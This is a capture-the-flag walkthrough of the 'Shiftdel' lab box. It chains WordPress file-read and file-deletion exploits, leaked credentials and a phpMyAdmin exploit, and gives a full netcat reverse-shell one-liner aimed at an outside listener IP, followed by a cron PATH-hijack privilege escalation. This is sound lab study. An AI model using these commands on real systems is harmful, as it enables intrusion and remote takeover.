# Shiftdel

I start off by scanning for open ports:

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Then i go and look at the webserver and see that it's running with wordpress:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i launch a wp-scan and find the wordpress version:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and after googling we find some interesting stuff:

{% embed url="https://www.exploit-db.com/exploits/50456" %}

{% embed url="https://www.exploit-db.com/exploits/47690" %}

so i'm able to read files and apparently the onboarding page had everything i needed:

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>IntraPersonalVision349</p></figcaption></figure>

So i found a password but no username that i'm sure of so i went and looked at my wpscan cheat sheets and tried to find something to enumerate users&#x20;

```
wpscan --url http://192.168.57.174 --enumerate u
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and i manage to login:

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

so there is not much going on and the account is restrictive so the only way to go must be the version exploit we found earlier ->

While reading the code i'm starting to understand how WTF this box is and why the hell as a pentester should i break the website to get my RCE, maybe this is blackhat training IDK but whatever ->

So i needed to:

```
Usage:
  1. Login to wordpress with privileges of an author
  2. Navigates to Media > Add New > Select Files > Open/Upload
  3. Click Edit > Open Developer Console > Paste this exploit script
  4. Execute the function, eg: unlink_thumb("../../../../wp-config.php")
```

So i start off by uploading a random png to the app and editing it:

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Then i reload and the website is totally screwed:

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and now i can curl wp-config.php without encoding:

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption><p>wordpress:ThinnerATheWaistline348</p></figcaption></figure>

With this i'm able to login in the php my admin instance:

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I see the version and i can use this exploit:

{% embed url="https://www.exploit-db.com/exploits/50457" %}

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
python2 50457.py 192.168.57.174 8888 / wordpress ThinnerATheWaistline348 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.49.57 1234 >/tmp/f'
```

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Looking thought the linpeas output we spot nothing, maybe some cronjobs that are not default like the wpclean?

<figure><img src="../../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

and looking at the script it's indeed the way to go:

<figure><img src="../../../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>

the  **`PATH`** environment is vulnerable

* `~/bin` expands to `/var/www/html/wordpress/wp-content/uploads/bin` (where you have write access).
* **This means `rm` is looked up in `~/bin` before `/usr/bin/rm`!**
* If an attacker creates an **executable file named `rm`** inside `~/bin`, it will be executed **instead of the real `/usr/bin/rm`**.

and after waiting for a bit i got my reverse shell:

<figure><img src="../../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>
